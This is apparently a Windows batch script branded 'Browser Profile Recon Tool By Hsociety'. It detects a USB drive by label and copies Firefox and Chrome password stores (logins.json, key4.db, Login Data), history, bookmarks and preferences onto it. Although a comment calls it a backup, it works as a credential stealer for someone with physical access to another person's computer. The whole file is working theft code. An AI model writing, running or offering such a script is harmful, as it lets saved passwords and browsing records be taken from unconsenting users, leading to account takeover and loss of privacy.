@echo off
:: Batch script to copy important Firefox and Chrome profiles data to USB automatically
:: BANNER
echo.
echo    ██╗  ██╗███████╗ ██████╗  ██████╗ ██████╗ ██╗████████╗██╗   ██╗
echo    ██║  ██║██╔════╝██╔═══██╗██╔════╝ ██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
echo    ███████║█████╗  ██║   ██║██║  ███╗██████╔╝██║   ██║    ╚████╔╝ 
echo    ██╔══██║██╔══╝  ██║   ██║██║   ██║██╔═══╝ ██║   ██║     ╚██╔╝  
echo    ██║  ██║███████╗╚██████╔╝╚██████╔╝██║     ██║   ██║      ██║   
echo    ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝   ╚═╝      ╚═╝   
echo.
echo                [ Browser Profile Recon Tool By Hsociety ]
echo.

:: Set the label of your USB drive
set USB_LABEL=Hsociety

:: Detect USB drive letter by label
for /f "skip=1 tokens=2 delims== " %%i in ('wmic volume where "label='%USB_LABEL%'" get DriveLetter /value') do (
    set USB_DRIVE=%%i
)

:: Check if the USB drive was detected
if "%USB_DRIVE%"=="" (
    echo USB drive with label "%USB_LABEL%" not found.
    pause
    exit /b
) else (
    echo USB drive detected: %USB_DRIVE%
)

:: Create a folder on USB to store the copied profiles
if not exist "%USB_DRIVE%\ProfilesBackup" mkdir "%USB_DRIVE%\ProfilesBackup"

:: Create a timestamped folder for this backup
setlocal enabledelayedexpansion
:: Format timestamp to avoid invalid characters (Remove slashes and colons)
set TIMESTAMP=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%_%TIME:~0,2%-%TIME:~3,2%-%TIME:~6,2%
set TIMESTAMP=!TIMESTAMP: =0!

:: Create timestamped folders
mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%"

:: Copy important Firefox files
echo Copying important Firefox files...
for /d %%d in ("%APPDATA%\Mozilla\Firefox\Profiles\*") do (
    mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd"
    xcopy "%%d\places.sqlite" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
    xcopy "%%d\logins.json" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
    xcopy "%%d\key4.db" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
    xcopy "%%d\prefs.js" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Firefox\%%~nd\" /i /h /y
)

:: Copy important Chrome files
echo Copying important Chrome files...
mkdir "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome"
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" "%USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%\Chrome\" /i /h /y

echo Important profiles copied successfully to %USB_DRIVE%\ProfilesBackup\Backup_%TIMESTAMP%
pause
